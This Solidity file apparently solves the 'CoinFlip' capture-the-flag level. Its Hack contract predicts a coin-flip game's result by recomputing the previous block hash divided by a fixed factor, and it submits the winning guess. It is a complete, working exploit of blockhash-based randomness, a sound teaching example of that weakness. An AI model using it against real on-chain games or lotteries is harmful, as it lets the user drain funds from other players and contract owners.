// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./CoinFlip.sol";

contract Hack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip private immutable coinFlip;
    constructor(address _coinFlip) {
        coinFlip = CoinFlip(_coinFlip);
    }

    function flip() external {
        bool guess = _guess();
        require(coinFlip.flip(guess),"Failed");
    }

    function _guess() private view returns(bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 Flip = blockValue / FACTOR;
        bool side = Flip == 1 ? true : false;
        return side;
    }

}


